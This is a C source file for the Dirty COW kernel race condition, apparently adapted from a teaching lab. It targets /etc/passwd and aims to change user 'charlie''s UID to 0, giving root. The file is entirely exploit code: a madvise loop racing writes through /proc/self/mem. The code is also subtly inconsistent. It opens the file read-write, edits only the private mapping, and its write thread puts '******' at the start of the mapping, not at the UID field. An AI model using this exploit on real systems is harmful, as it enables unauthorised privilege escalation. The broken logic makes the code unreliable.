#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in read-write mode.
  int f=open("/etc/passwd", O_RDWR);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, f, 0);

  // Find the position of the charlie user's entry
  char *charlie_entry = strstr(map, "charlie:");
  if (charlie_entry != NULL) {
    // Move the pointer to the UID field
    char *uid_field = strchr(charlie_entry, ':') + 1;
    uid_field = strchr(uid_field, ':') + 1; // Move to the UID field
    // Update the UID field to 0000
    strncpy(uid_field, "0000", 4);
  }

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, (void *)map);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "******";
  void *position = arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Write to the memory.
    pwrite(f, content, strlen(content), position);
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}
